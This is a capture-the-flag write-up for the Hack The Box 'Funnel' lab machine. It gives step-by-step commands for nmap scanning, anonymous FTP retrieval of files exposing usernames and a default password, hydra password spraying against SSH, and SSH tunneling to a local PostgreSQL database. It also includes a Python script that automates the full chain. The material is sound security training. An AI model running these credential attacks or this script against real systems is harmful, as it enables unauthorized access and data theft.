# HTB Funnel Writeup

## Introduction

The **Funnel** machine in Hack The Box (HTB) demonstrates the importance of secure network practices and how attackers can exploit weak configurations. This write-up covers **FTP enumeration, password spraying, SSH tunneling, and PostgreSQL exploitation** to retrieve the final flag.

## **Enumeration**

### **Nmap Scan**
We start by scanning the target IP using `nmap` to identify open ports and running services.

```bash
sudo nmap -sC -sV --min-rate=1000 -oA TunnelScan -p- 10.129.228.195 -Pn
```

#### **Results:**
- **Port 21** → `vsftpd 3.0.3` (Anonymous FTP Access)
- **Port 22** → `OpenSSH 8.2p1`
- **Local Port 5432** → `PostgreSQL (Found later via SSH tunneling)`

---

## **Exploiting FTP (Anonymous Access)**

We connect to FTP as an **anonymous user** and check available files.

```bash
ftp 10.129.228.195
# Login as anonymous
ls
```

Found directory **`mail_backup`** containing:
- `welcome_28112022`
- `password_policy.pdf`

We download these files:

```bash
cd mail_backup
get welcome_28112022
get password_policy.pdf
```

From the **welcome_28112022** file, we extract possible usernames:
- `optimus@funnel.htb`
- `albert@funnel.htb`
- `andreas@funnel.htb`
- **`christine@funnel.htb`** (did not change password)
- `maria@funnel.htb`

From `password_policy.pdf`, we find a **default password**:  
**`funnel123#!#`**

---

## **Password Spraying SSH**

Using `hydra`, we attempt password spraying against the SSH service.

```bash
hydra -L usernames.txt -p 'funnel123#!#' 10.129.228.195 ssh
```

Successful login found for:  
**`christine:funnel123#!#`**

We log in:

```bash
ssh christine@10.129.228.195
```

---

## **Local Port Enumeration (PostgreSQL Discovery)**

After gaining access, we check for locally running services:

```bash
ss -tl
```

We find **PostgreSQL (port 5432) is listening locally**.

---

## **SSH Tunneling to Expose PostgreSQL**

We set up an SSH tunnel to forward **local port 1234 → remote port 5432**.

```bash
ssh -L 1234:localhost:5432 christine@10.129.228.195
```

We verify the connection:

```bash
nmap -sV -sC -p 1234 localhost
```

---

## **Interacting with PostgreSQL**

We install the PostgreSQL client on our local machine.

```bash
sudo apt update && sudo apt install postgresql-client
```

Connect using `psql`:

```bash
psql -h 127.0.0.1 -p 1234 -U christine
```

List available databases:

```sql
\list
```

Connect to the `secrets` database:

```sql
\c secrets
```

Check for tables:

```sql
\dt
```

Retrieve the **flag**:

```sql
SELECT * FROM flag;
```

**FLAG:** `cf277664b1771217d7006acdea00****`

---

## **Automation Script (PoC)**

Below is a Python script that automates the entire process.

```python
import os
import paramiko
import psycopg2
import ftplib
import subprocess

TARGET_IP = "10.129.228.195"
FTP_DIR = "mail_backup"
USERNAME = "christine"
PASSWORD = "funnel123#!#"
LOCAL_PORT = 1234
REMOTE_PORT = 5432

def ftp_download():
    ftp = ftplib.FTP(TARGET_IP)
    ftp.login("anonymous", "")
    ftp.cwd(FTP_DIR)
    ftp.retrbinary("RETR welcome_28112022", open("welcome_28112022", "wb").write)
    ftp.retrbinary("RETR password_policy.pdf", open("password_policy.pdf", "wb").write)
    ftp.quit()

def ssh_tunnel():
    subprocess.Popen(f"ssh -L {LOCAL_PORT}:localhost:{REMOTE_PORT} {USERNAME}@{TARGET_IP}", shell=True)
    
def fetch_flag():
    conn = psycopg2.connect(dbname="secrets", user=USERNAME, password=PASSWORD, host="127.0.0.1", port=LOCAL_PORT)
    cur = conn.cursor()
    cur.execute("SELECT * FROM flag;")
    print("[FLAG]:", cur.fetchone()[0])
    conn.close()

ftp_download()
ssh_tunnel()
fetch_flag()
```

---

## **Conclusion**
By leveraging **FTP enumeration, SSH password spraying, local service discovery, and port forwarding**, we successfully retrieved the flag from the `secrets` database.
